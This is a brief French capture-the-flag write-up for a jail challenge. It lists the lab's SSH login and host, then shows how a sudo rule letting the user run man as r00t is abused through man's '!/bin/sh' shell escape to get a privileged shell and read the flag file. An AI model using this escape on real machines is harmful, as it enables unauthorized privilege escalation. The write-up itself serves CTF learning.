Le flag est situé ici : /home/r00t/flag/flag.txt

Nom d'utilisateur : jail
Mot de passe : jail
ssh -p 4445 jail@intro.ctfrei.fr 

----------------------------------------

Avec sudo -l on voit que l'on peu utiliser man en tant que r00t.

Grâce au site https://gtfobins.github.io/gtfobins/man/ on apprend que la commande man nous permet d'obtenir un shell avec les droit de r00t.

sudo -u r00t man man
!/bin/sh
$cat /home/r00t/flag/flag.txt
